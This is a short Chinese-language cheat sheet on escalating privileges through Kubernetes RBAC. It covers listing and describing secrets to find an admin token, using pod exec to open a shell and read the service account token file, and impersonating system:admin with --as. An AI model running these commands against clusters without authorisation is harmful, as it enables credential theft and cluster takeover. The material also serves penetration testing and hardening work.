  #### RBAC - 列出密钥
	如果用户附加了一个角色，允许他们列出密钥，可能会滥用它来提升权限。 当列出存储在集群中的所有机密时，其中之一将是管理令牌，允许攻击者在集群中获得最高权限
	> kubectl get secrets #记录NAME
	> kubectl describe secrets "NAME"
	#### RBAC - Pod 执行
	如果你的用户对"pods/exec"资源具有“创建”权限，可以在运行的 pod 上执行 shell 命令。
	连接到pod
	> kubectl exec --stdin --tty NAME_OF_POD -- /bin/bash
	查看令牌
	> cat /var/run/secrets/kubernetes.io/serviceaccount/token
  #### RBAC - 模拟
	如果用户有能力模拟用户或组，则可以利用它来提升权限
	> kubectl get secret --as=system:admin
	如上面的命令所示，您可以使用“--as”命令指定执行命令的用户。